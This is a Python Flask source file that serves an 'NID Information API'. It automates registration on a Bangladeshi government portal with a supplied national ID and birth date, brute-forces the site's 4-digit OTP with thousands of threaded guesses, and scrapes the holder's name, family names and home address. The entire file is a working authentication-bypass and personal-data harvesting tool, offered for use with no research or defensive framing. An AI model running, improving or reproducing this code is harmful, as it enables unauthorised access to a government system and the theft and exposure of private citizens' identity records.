from flask import Flask, request, jsonify
import requests
import random
import string
import re
import json
import os
import time
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

def extract_selected_option(html_content, field_id):
    """Extract selected option from a dropdown menu using regex"""
    pattern = rf'<select[^>]*id="{field_id}"[^>]*>.*?<option[^>]*selected[^>]*>(.*?)</option>'
    match = re.search(pattern, html_content, re.DOTALL)
    if match:
        return re.sub(r'<[^>]*>', '', match.group(1)).strip()
    return ""

@app.route('/')
def home():
    return jsonify({
        "status": "Enhanced NID Service v2.0",
        "message": "Bangladeshi NID Information API",
        "usage": "GET /get-info?nid=YOUR_NID&dob=YOUR_DOB",
        "example": "/get-info?nid=1234567890&dob=01-01-1990",
        "format": "DOB format: DD-MM-YYYY or DD/MM/YYYY",
        "note": "Processing may take 60-120 seconds",
        "features": ["Smart OTP detection", "Multiple attempt strategies", "Enhanced success rate"]
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "service": "nid-api", "version": "2.0"})

@app.route('/debug', methods=['GET'])
def debug_endpoint():
    """Debug endpoint to test website connectivity"""
    try:
        nid = request.args.get('nid', '1234567890')
        dob = request.args.get('dob', '01-01-1990')
        
        url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
        session = requests.Session()
        
        # Test basic connectivity
        test_data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": "01712345678",
            "dateOfBirth": dob,
            "password": "#A123",
            "confirm_password": "#A123",
            "next1": ""
        }
        
        response = session.post(url, data=test_data, timeout=15, allow_redirects=False)
        
        return jsonify({
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "redirect_location": response.headers.get('Location', 'None'),
            "connectivity": "OK" if response.status_code in [200, 302] else "FAILED",
            "next_step": "mov-verification" if 'mov-verification' in response.headers.get('Location', '') else "UNKNOWN"
        })
        
    except Exception as e:
        return jsonify({"error": str(e), "connectivity": "FAILED"})

@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')
        strategy = request.args.get('strategy', 'smart')  # smart, random, sequential
        
        if not nid or not dob:
            return jsonify({
                'error': 'NID and DOB are required', 
                'format': 'nid=1234567890&dob=01-01-1990',
                'optional': 'strategy=smart|random|sequential'
            }), 400

        # Normalize DOB format
        dob = dob.replace('/', '-')

        # ==================== ENHANCED CONFIG ====================
        mobile_prefix = "017"
        target_location = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
        
        # Smart OTP generation based on strategy
        if strategy == 'smart':
            # Try common patterns first
            otp_range = generate_smart_otps()
            batch_size = 100
            max_batches = 20
        elif strategy == 'random':
            # Random sampling
            otp_range = random.sample([f"{i:04d}" for i in range(10000)], 3000)
            batch_size = 150
            max_batches = 20
        else:  # sequential
            otp_range = [f"{i:04d}" for i in range(5000)]  # Try more combinations
            batch_size = 200
            max_batches = 25

        def generate_smart_otps():
            """Generate OTPs with smart patterns that are more likely to be used"""
            otps = []
            
            # Common patterns
            patterns = [
                # Birth year related (if DOB provided)
                lambda: [f"{dob[-2:]}{i:02d}" for i in range(100)] if len(dob) >= 4 else [],
                # Common sequences
                lambda: ["0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999"],
                # Year patterns
                lambda: [f"{year}" for year in range(1980, 2025)],
                # Simple sequences
                lambda: [f"{i:04d}" for i in range(0, 1000, 11)],  # 0000, 0011, 0022, etc.
                # Random but weighted towards lower numbers
                lambda: [f"{i:04d}" for i in random.sample(range(2000), 1500)]
            ]
            
            for pattern_func in patterns:
                try:
                    otps.extend(pattern_func())
                except:
                    continue
            
            # Remove duplicates and ensure we have enough
            otps = list(set(otps))
            
            # Fill up to desired amount with random
            while len(otps) < 3000:
                otps.append(f"{random.randint(0, 9999):04d}")
            
            return otps[:3000]

        def random_mobile(prefix):
            return prefix + f"{random.randint(0, 99999999):08d}"

        def random_password():
            return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(10, 99)}"

        def get_session_with_retry(data, max_retries=3):
            """Get session with retry logic"""
            for attempt in range(max_retries):
                try:
                    session = requests.Session()
                    
                    # Enhanced headers
                    session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Language': 'bn,en-US;q=0.9,en;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1'
                    })
                    
                    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
                    
                    # Add small delay between attempts
                    if attempt > 0:
                        time.sleep(2)
                    
                    res = session.post(url, data=data, allow_redirects=False, timeout=25)
                    
                    if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
                        return session, f"Success on attempt {attempt + 1}"
                    elif res.status_code == 200:
                        # Maybe the flow changed, check response content
                        if 'otp' in res.text.lower() or 'verification' in res.text.lower():
                            return session, f"Possible success on attempt {attempt + 1} (status 200)"
                    
                    print(f"Attempt {attempt + 1}: Status {res.status_code}, Location: {res.headers.get('Location', 'None')}")
                    
                except requests.exceptions.Timeout:
                    print(f"Attempt {attempt + 1}: Timeout")
                    if attempt == max_retries - 1:
                        raise Exception("Connection timeout after all retries")
                except Exception as e:
                    print(f"Attempt {attempt + 1}: Error - {e}")
                    if attempt == max_retries - 1:
                        raise Exception(f"Failed after {max_retries} attempts: {str(e)}")
            
            raise Exception("Could not establish session")

        def try_otp_enhanced(session, otp):
            """Enhanced OTP testing with better error handling"""
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
            data = {
                "otpDigit1": otp[0],
                "otpDigit2": otp[1],
                "otpDigit3": otp[2],
                "otpDigit4": otp[3]
            }
            try:
                res = session.post(url, data=data, allow_redirects=False, timeout=8)
                if res.status_code == 302:
                    location = res.headers.get('Location', '')
                    if target_location in location:
                        return otp
                    elif 'form' in location:  # Alternative success indicator
                        return otp
                elif res.status_code == 200:
                    # Check if we're redirected to success page
                    if 'contractor' in res.url.lower() and 'form' in res.url.lower():
                        return otp
            except:
                pass
            return None

        def try_batch_enhanced(session, otp_batch, batch_num, total_batches):
            """Enhanced batch processing"""
            print(f"Processing batch {batch_num}/{total_batches} ({len(otp_batch)} OTPs)...")
            
            results = []
            # Reduced workers to prevent overwhelming
            with ThreadPoolExecutor(max_workers=8) as executor:
                future_to_otp = {executor.submit(try_otp_enhanced, session, otp): otp for otp in otp_batch}
                
                try:
                    for future in as_completed(future_to_otp, timeout=30):
                        try:
                            result = future.result()
                            if result:
                                print(f"🎉 Found working OTP: {result}")
                                executor.shutdown(cancel_futures=True)
                                return result
                        except:
                            continue
                except:
                    print(f"Batch {batch_num} timed out")
                    
            return None

        def extract_data_enhanced(session):
            """Enhanced data extraction with fallbacks"""
            urls_to_try = [
                "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form",
                "https://fsmms.dgf.gov.bd/bn/step2/movementContractor",
            ]
            
            for url in urls_to_try:
                try:
                    res = session.get(url, timeout=20)
                    if res.status_code == 200 and len(res.text) > 1000:
                        return res.text
                except:
                    continue
            
            raise Exception("Could not fetch form data from any URL")

        # Main processing
        print(f"🚀 Starting enhanced NID lookup for: {nid}")
        print(f"📅 DOB: {dob}")
        print(f"🎯 Strategy: {strategy}")
        print(f"🔢 Will try up to {min(len(otp_range), max_batches * batch_size)} OTP combinations")

        # Generate random credentials
        mobile = random_mobile(mobile_prefix)
        password = random_password()
        
        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": mobile,
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        }

        # Step 1: Get session
        print("🔗 Establishing session...")
        session, session_msg = get_session_with_retry(data)
        print(f"✅ {session_msg}")

        # Step 2: Try OTP combinations
        print("🔓 Starting OTP brute force...")
        
        if strategy == 'smart':
            print("🧠 Using smart pattern detection...")
        elif strategy == 'random':
            print("🎲 Using random sampling...")
        else:
            print("📊 Using sequential approach...")
        
        found_otp = None
        total_batches = min(max_batches, len(otp_range) // batch_size + 1)
        
        for i in range(0, min(len(otp_range), max_batches * batch_size), batch_size):
            batch_num = (i // batch_size) + 1
            if batch_num > max_batches:
                break
                
            batch = otp_range[i:i+batch_size]
            
            try:
                found_otp = try_batch_enhanced(session, batch, batch_num, total_batches)
                if found_otp:
                    break
            except Exception as e:
                print(f"❌ Batch {batch_num} failed: {e}")
                continue

        if found_otp:
            print(f"🎯 Success! Found OTP: {found_otp}")
            
            # Extract data
            html_content = extract_data_enhanced(session)
            
            # Parse fields
            field_ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice", 
                "nidPerHolding", "nidPerMouza"
            ]
            
            extracted_data = {}
            for field_id in field_ids:
                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
                extracted_data[field_id] = match.group(1) if match else ""

            # Build response
            result = {
                "success": True,
                "nationalId": nid,
                "dateOfBirth": dob,
                "nameBangla": extracted_data.get("contractorName", ""),
                "nameEnglish": "",
                "fatherName": extracted_data.get("fatherName", ""),
                "motherName": extracted_data.get("motherName", ""),
                "spouseName": extracted_data.get("spouseName", ""),
                "division": extracted_data.get("nidPerDivision", ""),
                "district": extracted_data.get("nidPerDistrict", ""),
                "upazila": extracted_data.get("nidPerUpazila", ""),
                "union": extracted_data.get("nidPerUnion", ""),
                "village": extracted_data.get("nidPerVillage", ""),
                "ward": extracted_data.get("nidPerWard", ""),
                "zipCode": extracted_data.get("nidPerZipCode", ""),
                "postOffice": extracted_data.get("nidPerPostOffice", ""),
                "holding": extracted_data.get("nidPerHolding", ""),
                "mouza": extracted_data.get("nidPerMouza", ""),
                "_metadata": {
                    "foundOTP": found_otp,
                    "strategy": strategy,
                    "attemptsUsed": f"{i + len(batch)} combinations",
                    "processingTime": "Less than 2 minutes"
                }
            }
            
            return jsonify(result), 200
            
        else:
            tried_count = min(max_batches * batch_size, len(otp_range))
            return jsonify({
                "success": False,
                "error": "OTP not found",
                "message": f"Tried {tried_count} combinations using {strategy} strategy",
                "suggestions": [
                    "Try different strategy: ?strategy=random or ?strategy=smart",
                    "The correct OTP might be in the untried combinations",
                    "Try again later - the OTP generation might be time-based",
                    "Verify your NID and DOB are correct"
                ],
                "nextSteps": {
                    "tryRandom": f"/get-info?nid={nid}&dob={dob}&strategy=random",
                    "trySmart": f"/get-info?nid={nid}&dob={dob}&strategy=smart"
                }
            }), 404
            
    except Exception as e:
        error_details = str(e)
        print(f"💥 Fatal error: {error_details}")
        
        return jsonify({
            "success": False,
            "error": error_details,
            "type": type(e).__name__,
            "troubleshooting": [
                "Check if the target website is accessible",
                "Verify NID format (10 or 17 digits)",
                "Verify DOB format (DD-MM-YYYY or DD/MM/YYYY)",
                "Try the /debug endpoint to test connectivity"
            ],
            "debug_endpoint": "/debug?nid=YOUR_NID&dob=YOUR_DOB"
        }), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
